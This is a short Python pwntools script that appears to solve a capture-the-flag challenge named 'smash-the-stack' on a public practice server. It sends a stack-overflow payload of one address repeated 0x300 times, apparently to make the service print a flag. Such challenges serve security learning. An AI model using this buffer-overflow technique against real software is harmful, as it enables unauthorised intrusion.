from pwn import *

def main():
    #r = process("./asset/smash-the-stack")
    r = remote('hackme.inndy.tw',7717)
    r.recvuntil(b'Try to read the flag\n')
    target_abbr = 0x0804a060
    p = p32(target_abbr) * 0x300

    r.send(p)
    r.interactive()


if __name__ == "__main__":
    main()
